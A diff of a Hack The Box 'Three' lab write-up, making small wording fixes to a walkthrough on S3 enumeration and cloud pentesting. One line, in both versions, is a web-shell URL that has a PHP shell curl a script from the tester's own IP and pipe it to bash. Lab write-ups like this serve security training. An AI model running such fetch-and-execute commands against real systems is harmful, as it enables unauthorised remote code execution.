@@ -4,7 +4,7 @@
 
 # _**Summary**_ 
 
-* _in this Box will new some steps in *cloud pentesting* and will know about *Amazon S3* and how we can know about its contents and how make our machine contact easily with it._ 
+* _in this Box will know some steps in *cloud pentesting* and will know about *Amazon S3* and how we can know about its contents and how make our machine contact easily with it._ 
 
 # _**NMAP**_
 ![](/Assets/HTB/THREE/assets/namp.png)
@@ -30,7 +30,7 @@ _we found subdomain will be foucs with it **s3.thetoppers.htb** by search on goo
 
 ![](/Assets/HTB/THREE/assets/s3amazon.png)
 
-_**NOTE**  we should add the subdomain **s3.thetopper.htb** in /etc/hosts like that_ 
+_**NOTE** :  we should add the subdomain **s3.thetopper.htb** in /etc/hosts like that_ 
 
 
 ![](/Assets/HTB/THREE/assets/s3.png)
@@ -103,7 +103,9 @@ _by this command will start http server **python3 -m http.server 8000**_
 
 ![](/Assets/HTB/THREE/assets/httpremote.png)
 
-_we will use **curl** to fetch the bash file and do that in browser by this **http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash**_ 
+_we will use **curl** to fetch the bash file and do that in browser by this_
+
+**http://thetoppers.htb/shell.php?cmd=curl%20MY_IP:8000/shell.sh|bash**_ 
 
 ![](/Assets/HTB/THREE/assets/remote1.png)
 
